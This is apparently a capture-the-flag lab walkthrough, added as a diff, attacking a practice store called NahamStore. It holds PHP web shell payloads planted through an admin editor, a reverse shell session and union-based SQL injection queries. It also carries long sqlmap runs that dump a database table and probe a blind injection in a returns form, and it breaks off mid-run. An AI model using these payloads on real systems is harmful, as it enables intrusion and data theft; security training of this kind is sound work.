@@ -3317,3 +3317,1110 @@ Nmap done: 1 IP address (1 host up) scanned in 20.86 seconds
 
 | http-robots.txt: 1 disallowed entry 
 |_/admin let's see it :)
+
+http://10.10.250.217:8000/admin/login (brute force or default creds)
+
+admin' or 1=1 # (not work) just do it with admin:admin (works)
+
+we can edit let's first test 
+
+<?php echo('test')?>
+
+payloads : 
+
+'<?php system($_GET['x']); ?>'
+'<?php system($_REQUEST['x']); ?>'
+'<?php echo system($_REQUEST['x']); ?>'
+'<?php echo shell_exec($_GET['x']); ?>'
+
+editing
+<?php system($_GET['x']); ?>
+
+http://marketing.nahamstore.thm/8d1952ba2b3c6dcd76236f090ab8642c?x=whoami
+
+www-data it works now uploading php ivan sincek (it is really good bypass waf (Web application firewall if there is -- Holo)
+
+https://www.revshells.com/
+
+┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
+└─$ rlwrap nc -lvnp 1338
+listening on [any] 1338 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.250.217] 54264
+SOCKET: Shell has connected! PID: 2603
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@af11c847d4c7:~/html/marketing/public$ find / -type f -name flag.txt 2>/dev/null
+<g/public$ find / -type f -name flag.txt 2>/dev/null
+/flag.txt
+www-data@af11c847d4c7:~/html/marketing/public$ ls
+ls
+index.php
+www-data@af11c847d4c7:~/html/marketing/public$ cd /
+cd /
+www-data@af11c847d4c7:/$ ls
+ls
+bin   etc	lib    libx32  opt   run   startup.sh  usr
+boot  flag.txt	lib32  media   proc  sbin  sys	       var
+dev   home	lib64  mnt     root  srv   tmp
+www-data@af11c847d4c7:/$ cat flag.txt
+cat flag.txt
+{b42d2f1ff39874d56132537be62cf9e3}
+
+www-data@af11c847d4c7:~/html/marketing/public$ ls -lah /
+ls -lah /
+total 72K
+drwxr-xr-x   1 root root 4.0K May  6  2021 .
+drwxr-xr-x   1 root root 4.0K May  6  2021 ..
+-rwxr-xr-x   1 root root    0 May  6  2021 .dockerenv
+lrwxrwxrwx   1 root root    7 Jan 19  2021 bin -> usr/bin
+drwxr-xr-x   2 root root 4.0K Apr 15  2020 boot
+drwxr-xr-x   5 root root  360 Mar 23 18:00 dev
+drwxr-xr-x   1 root root 4.0K May  6  2021 etc
+-rw-r--r--   1 root root   35 Feb 17  2021 flag.txt
+drwxr-xr-x   2 root root 4.0K Apr 15  2020 home
+lrwxrwxrwx   1 root root    7 Jan 19  2021 lib -> usr/lib
+lrwxrwxrwx   1 root root    9 Jan 19  2021 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root    9 Jan 19  2021 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root   10 Jan 19  2021 libx32 -> usr/libx32
+drwxr-xr-x   2 root root 4.0K Jan 19  2021 media
+drwxr-xr-x   2 root root 4.0K Jan 19  2021 mnt
+drwxr-xr-x   2 root root 4.0K Jan 19  2021 opt
+dr-xr-xr-x 187 root root    0 Mar 23 18:00 proc
+drwx------   2 root root 4.0K Jan 19  2021 root
+drwxr-xr-x   1 root root 4.0K May  6  2021 run
+lrwxrwxrwx   1 root root    8 Jan 19  2021 sbin -> usr/sbin
+drwxr-xr-x   2 root root 4.0K Jan 19  2021 srv
+-rwxr-xr-x   1 root root   88 Feb 17  2021 startup.sh
+dr-xr-xr-x  13 root root    0 Mar 23 18:00 sys
+drwxrwxrwt   1 root root 4.0K Mar 23 18:00 tmp
+drwxr-xr-x   1 root root 4.0K Jan 19  2021 usr
+drwxr-xr-x   1 root root 4.0K Feb 17  2021 var
+
+Like I thought we were in a docker container
+```
+First RCE flag
+*{b42d2f1ff39874d56132537be62cf9e3}*
+Second RCE flag
+*{93125e2a845a38c3e1531f72c250e676}*
+### SQL Injection
+There are 2 SQL Injection vulnerabilities somewhere in the NahamStore domain. One will return data to the page and the other is blind. The flags can be found in the database tables called sqli_one & sql_two in the column name flag.
+Answer the questions below
+```text
+https://github.com/eslam3kl/SQLiDetector
+
+┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
+└─$ echo "http://testphp.vulnweb.com/artists.php?artist=1" > test
+                                                                                                                   
+┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
+└─$ python3 sqlidetector.py -f test -w 10                        
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
+|S|Q|L|i| |D|e|t|e|c|t|o|r|
+| Coded By: Eslam Akl @eslam3kll & Khaled Nassar @knassar702
+| Version: 1.0.0
+| Blog: eslam3kl.medium.com
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
+>>>  http://testphp.vulnweb.com/artists.php?artist='123  Warning.*?\Wmysqli?_
+>>>  http://testphp.vulnweb.com/artists.php?artist=`)123  Warning.*?\Wmysqli?_
+>>>  http://testphp.vulnweb.com/artists.php?artist=')123"123  Warning.*?\Wmysqli?_
+>>>  http://testphp.vulnweb.com/artists.php?artist=''123  Warning.*?\Wmysqli?_
+>>>  http://testphp.vulnweb.com/artists.php?artist='))123  Warning.*?\Wmysqli?_
+>>>  http://testphp.vulnweb.com/artists.php?artist=[]123  Warning.*?\Wmysqli?_
+>>>  http://testphp.vulnweb.com/artists.php?artist=`123  Warning.*?\Wmysqli?_
+>>>  http://testphp.vulnweb.com/artists.php?artist="))123  Warning.*?\Wmysqli?_
+>>>  http://testphp.vulnweb.com/artists.php?artist=`))123  Warning.*?\Wmysqli?_
+>>>  http://testphp.vulnweb.com/artists.php?artist=")123  Warning.*?\Wmysqli?_
+>>>  http://testphp.vulnweb.com/artists.php?artist='"123  Warning.*?\Wmysqli?_
+>>>  http://testphp.vulnweb.com/artists.php?artist=""123  Warning.*?\Wmysqli?_
+>>>  http://testphp.vulnweb.com/artists.php?artist=\123  Warning.*?\Wmysqli?_
+>>>  http://testphp.vulnweb.com/artists.php?artist="'123  Warning.*?\Wmysqli?_
+ Scanning 14/14 | 100%  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
+
+doing manually
+
+GET /search?q=test' HTTP/1.1
+Search Results For "test'"
+
+payloads: test') , ", "; also can do it before the parameter
+
+GET /search?q'=a' HTTP/1.1
+
+GET /search?q')=a") HTTP/1.1
+
+GET /search?"q=a") HTTP/1.1 maybe blind sqli
+
+GET /search?q=test') sleep(5) HTTP/1.1
+
+GET /search?q[]=test') HTTP/1.1
+Search Results For "Array"
+
+here there a nice wordlist
+
+https://raw.githubusercontent.com/orwagodfather/WordList/main/SQL.txt
+
+also can test in cookies or user-agent
+
+GET /product?id=2' HTTP/1.1
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 1' at line 1
+
+GET /product?id=1337+union+select+1,2,3,4,5+--+- HTTP/1.1
+
+<strong>2</strong></div>
+<div style="margin-bottom:20px">$0.03</div>
+<div style="margin-bottom:20px">4
+
+so 2 and 4 to show
+
+GET /product?id=1337+union+select+1,version(),3,database(),5+--+- HTTP/1.1
+
+<strong>8.0.23-0ubuntu0.20.04.1</strong></div>
+<div style="margin-bottom:20px">$0.03</div>
+<div style="margin-bottom:20px">nahamstore
+
+GET /product?id=1337+union+select+1,2,3,group_concat(table_name),null+from+information_schema.tables+--+- HTTP/1.1
+
+<div style="margin-bottom:20px">ADMINISTRABLE_ROLE_AUTHORIZATIONS,APPLICABLE_ROLES,CHARACTER_SETS,CHECK_CONSTRAINTS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMNS_EXTENSIONS,COLUMN_PRIVILEGES,COLUMN_STATISTICS,ENABLED_ROLES,ENGINES,EVENTS,FILES,INNODB_BUFFER_PAGE,INNODB_BUFFER_PAGE_LRU,INNODB_BUFFER_POOL_STATS,INNODB_CACHED_INDEXES,INNODB_CMP,INNODB_CMPMEM,INNODB_CMPMEM_RESET,INNODB_CMP_PER_INDEX,INNODB_CMP_PER_INDEX_RESET,INNODB_CMP_RESET,INNODB_COLUMNS,INNODB_DATAFILES,INNODB_FIELDS,INNODB_FOREIGN,INNODB_FOREIGN_COLS,INNODB_FT_BEING_DELETED,INNODB_FT_CONFIG,INNODB_FT_DEFAULT_STOPWORD,INNODB_FT_DELETED,INNODB_FT_INDEX_CACHE,INNODB_FT_INDEX_TABLE,INNODB_INDEXES,INNODB_METRICS,INNODB_SESSION_TEMP_TABLESPACES,INNODB_TABLES,INNODB_TABLESPACES,INNODB_TABLESPACES_BRIEF,INNODB_TABLESTATS,INNODB_TEMP_TABLE_INFO,INNODB_TRX,INNODB_VIRTUAL,KEYWORDS,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,RESOURCE_GROUPS,ROLE_COLUMN_GRANTS,ROLE_ROUTINE_GRANTS,ROLE_TABLE_GRANTS,ROUTI</div>
+
+so need to specify the database name
+
+GET /product?id=1337+union+select+1,2,3,group_concat(table_name),null+from+information_schema.tables+where+table_schema='nahamstore'+--+- HTTP/1.1
+
+<div style="margin-bottom:20px">product,sqli_one</div>
+
+GET /product?id=1337+union+select+1,2,3,group_concat(column_name),null+from+information_schema.columns+where+table_name='sqli_one'+--+- HTTP/1.1
+
+<div style="margin-bottom:20px">id,flag</div>
+
+GET /product?id=1337+union+select+1,2,3,group_concat(id,0x3a,flag),null+from+sqli_one+--+- HTTP/1.1
+
+<div style="margin-bottom:20px">1:{d890234e20be48ff96a2f9caab0de55c}</div>
+
+Now let's do it with sqlmap in order to do that save request
+
+┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
+└─$ cat req_1 
+GET /product?id=1 HTTP/1.1
+Host: nahamstore.thm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://nahamstore.thm/
+Cookie: token=f7dc5a32...; session=a2c6214754a5...
+Upgrade-Insecure-Requests: 1
+
+┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
+└─$ sqlmap -r req_1 --batch   
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.7.2#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:12:57 //
+
+[00:12:57] [INFO] parsing HTTP request from 'req_1'
+Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[00:12:58] [INFO] testing connection to the target URL
+[00:12:58] [INFO] checking if the target is protected by some kind of WAF/IPS
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+[00:12:59] [INFO] testing if the target URL content is stable
+[00:12:59] [INFO] target URL content is stable
+[00:12:59] [INFO] testing if GET parameter 'id' is dynamic
+[00:12:59] [WARNING] GET parameter 'id' does not appear to be dynamic
+[00:12:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[00:13:00] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
+[00:13:00] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[00:13:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[00:13:00] [WARNING] reflective value(s) found and filtering out
+[00:13:01] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
+[00:13:01] [INFO] testing 'Generic inline queries'
+[00:13:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[00:13:02] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[00:13:02] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[00:13:02] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[00:13:02] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[00:13:03] [INFO] GET parameter 'id' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
+[00:13:03] [INFO] testing 'MySQL inline queries'
+[00:13:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[00:13:03] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)
+[00:13:17] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
+[00:13:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[00:13:28] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[00:13:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[00:13:28] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[00:13:29] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[00:13:30] [INFO] target URL appears to have 5 columns in query
+[00:13:32] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 3571=3571
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=1 AND GTID_SUBSET(CONCAT(0x71766a7071,(SELECT (ELT(6390=6390,1))),0x7176786b71),6390)
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 9901 FROM (SELECT(SLEEP(5)))rdMW)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=-7146 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766a7071,0x6d4f4d437148694a63766e48616579506763727353514f666a44706571695478794f455361736e50,0x7176786b71),NULL-- -
+---
+[00:13:32] [INFO] the back-end DBMS is MySQL
+[00:13:33] [WARNING] potential permission problems detected ('command denied')
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.14.0
+back-end DBMS: MySQL >= 5.6
+[00:13:34] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 15 times
+[00:13:34] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'
+
+[*] ending @ 00:13:34 //
+
+┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
+└─$ sqlmap -r req_1 --batch --dbs
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.7.2#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:14:24 //
+
+[00:14:24] [INFO] parsing HTTP request from 'req_1'
+Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[00:14:25] [INFO] resuming back-end DBMS 'mysql' 
+[00:14:25] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 3571=3571
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=1 AND GTID_SUBSET(CONCAT(0x71766a7071,(SELECT (ELT(6390=6390,1))),0x7176786b71),6390)
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 9901 FROM (SELECT(SLEEP(5)))rdMW)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=-7146 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766a7071,0x6d4f4d437148694a63766e48616579506763727353514f666a44706571695478794f455361736e50,0x7176786b71),NULL-- -
+---
+[00:14:25] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.14.0
+back-end DBMS: MySQL >= 5.6
+[00:14:25] [INFO] fetching database names
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+available databases [2]:
+[*] information_schema
+[*] nahamstore
+
+[00:14:26] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'
+
+[*] ending @ 00:14:26 //
+
+┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
+└─$ sqlmap -r req_1 --batch -D nahamstore --tables
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.7.2#stable}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:15:12 //
+
+[00:15:12] [INFO] parsing HTTP request from 'req_1'
+Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[00:15:13] [INFO] resuming back-end DBMS 'mysql' 
+[00:15:13] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 3571=3571
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=1 AND GTID_SUBSET(CONCAT(0x71766a7071,(SELECT (ELT(6390=6390,1))),0x7176786b71),6390)
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 9901 FROM (SELECT(SLEEP(5)))rdMW)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=-7146 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766a7071,0x6d4f4d437148694a63766e48616579506763727353514f666a44706571695478794f455361736e50,0x7176786b71),NULL-- -
+---
+[00:15:13] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.14.0
+back-end DBMS: MySQL >= 5.6
+[00:15:13] [INFO] fetching tables for database: 'nahamstore'
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+Database: nahamstore
+[2 tables]
++----------+
+| product  |
+| sqli_one |
++----------+
+
+[00:15:14] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'
+
+[*] ending @ 00:15:14 //
+
+┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
+└─$ sqlmap -r req_1 --batch -D nahamstore -T sqli_one --columns
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.7.2#stable}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:16:03 //
+
+[00:16:03] [INFO] parsing HTTP request from 'req_1'
+Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[00:16:04] [INFO] resuming back-end DBMS 'mysql' 
+[00:16:04] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 3571=3571
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=1 AND GTID_SUBSET(CONCAT(0x71766a7071,(SELECT (ELT(6390=6390,1))),0x7176786b71),6390)
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 9901 FROM (SELECT(SLEEP(5)))rdMW)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=-7146 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766a7071,0x6d4f4d437148694a63766e48616579506763727353514f666a44706571695478794f455361736e50,0x7176786b71),NULL-- -
+---
+[00:16:04] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.14.0
+back-end DBMS: MySQL >= 5.6
+[00:16:04] [INFO] fetching columns for table 'sqli_one' in database 'nahamstore'
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+Database: nahamstore
+Table: sqli_one
+[2 columns]
++--------+-------------+
+| Column | Type        |
++--------+-------------+
+| flag   | varchar(34) |
+| id     | int         |
++--------+-------------+
+
+[00:16:04] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'
+
+[*] ending @ 00:16:04 //
+
+┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
+└─$ sqlmap -r req_1 --batch -D nahamstore -T sqli_one --dump   
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.7.2#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:16:19 //
+
+[00:16:19] [INFO] parsing HTTP request from 'req_1'
+Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[00:16:20] [INFO] resuming back-end DBMS 'mysql' 
+[00:16:20] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 3571=3571
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=1 AND GTID_SUBSET(CONCAT(0x71766a7071,(SELECT (ELT(6390=6390,1))),0x7176786b71),6390)
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 9901 FROM (SELECT(SLEEP(5)))rdMW)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=-7146 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71766a7071,0x6d4f4d437148694a63766e48616579506763727353514f666a44706571695478794f455361736e50,0x7176786b71),NULL-- -
+---
+[00:16:20] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.14.0
+back-end DBMS: MySQL >= 5.6
+[00:16:20] [INFO] fetching columns for table 'sqli_one' in database 'nahamstore'
+[00:16:20] [INFO] fetching entries for table 'sqli_one' in database 'nahamstore'
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+Database: nahamstore
+Table: sqli_one
+[1 entry]
++----+------------------------------------+
+| id | flag                               |
++----+------------------------------------+
+| 1  | {d890234e20be48ff96a2f9caab0de55c} |
++----+------------------------------------+
+
+[00:16:21] [INFO] table 'nahamstore.sqli_one' dumped to CSV file '/home/witty/.local/share/sqlmap/output/nahamstore.thm/dump/nahamstore/sqli_one.csv'
+[00:16:21] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/nahamstore.thm'
+
+[*] ending @ 00:16:21 //
+
+now finding another sqli
+
+-----------------------------146320265839157975802094687199
+
+Content-Disposition: form-data; name="order_number"
+
+1;SELECT SLEEP(5)#
+
+-----------------------------146320265839157975802094687199
+
+Content-Disposition: form-data; name="return_reason"
+
+1
+
+-----------------------------146320265839157975802094687199
+
+Content-Disposition: form-data; name="return_info"
+
+1
+
+-----------------------------146320265839157975802094687199--
+
+HTTP/1.1 302 Found
+
+Server: nginx/1.14.0 (Ubuntu)
+
+Date: Fri, 24 Mar 2023 04:25:27 GMT
+
+Content-Type: text/html; charset=UTF-8
+
+Connection: close
+
+Set-Cookie: session=a2c6214754a5486e6d953d76919a1e7c; expires=Fri, 24-Mar-2023 05:25:22 GMT; Max-Age=3600; path=/
+
+Location: /returns/167?auth=5878a7ab84fb43402106c575658472fa
+
+Content-Length: 0
+
+after 5 seconds so is blind 
+
+┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
+└─$ cat req_2               
+POST /returns HTTP/1.1
+Host: nahamstore.thm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------146320265839157975802094687199
+Content-Length: 420
+Origin: http://nahamstore.thm
+Connection: close
+Referer: http://nahamstore.thm/returns
+Cookie: token=f7dc5...; session=a2c...
+Upgrade-Insecure-Requests: 1
+
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="order_number"
+
+1
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_reason"
+
+1
+-----------------------------146320265839157975802094687199
+Content-Disposition: form-data; name="return_info"
+
+1
+-----------------------------146320265839157975802094687199--
+
+┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
+└─$ sqlmap -r req_2 --batch                                    
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.7.2#stable}
+|_ -| . [']     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:21:54 //
+
+[00:21:54] [INFO] parsing HTTP request from 'req_2'
+Multipart-like data found in POST body. Do you want to process it? [Y/n/q] Y
+Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[00:21:55] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://nahamstore.thm:80/returns/5?auth=e4da3b7fbbce2345d7772b0674a318d5'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+[00:21:56] [INFO] testing if the target URL content is stable
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+[00:21:56] [WARNING] (custom) POST parameter 'MULTIPART order_number' does not appear to be dynamic
+[00:21:56] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'MULTIPART order_number' might not be injectable
+[00:21:57] [INFO] testing for SQL injection on (custom) POST parameter 'MULTIPART order_number'
+[00:21:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[00:21:58] [INFO] (custom) POST parameter 'MULTIPART order_number' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[00:22:03] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
